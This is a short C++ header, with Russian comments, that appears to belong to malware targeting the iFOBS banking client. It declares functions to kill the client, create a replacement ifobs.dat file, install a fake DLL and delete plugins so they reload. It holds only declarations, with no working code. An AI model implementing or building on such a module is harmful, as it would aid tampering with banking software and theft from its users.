#ifndef IFobsH
#define IFobsH


namespace IFobs
{

bool Init( const char* appName );
DWORD WINAPI KillIFobs(void*);
//создает файл подмены ifobs.dat
void CreateFileReplacing( const char* s );
DWORD WINAPI InstallFakeDll(void*);
//удаляет загруженные плагины, чтобы они потом обновились
void DeletePlugins();

};


#endif //IFobsH
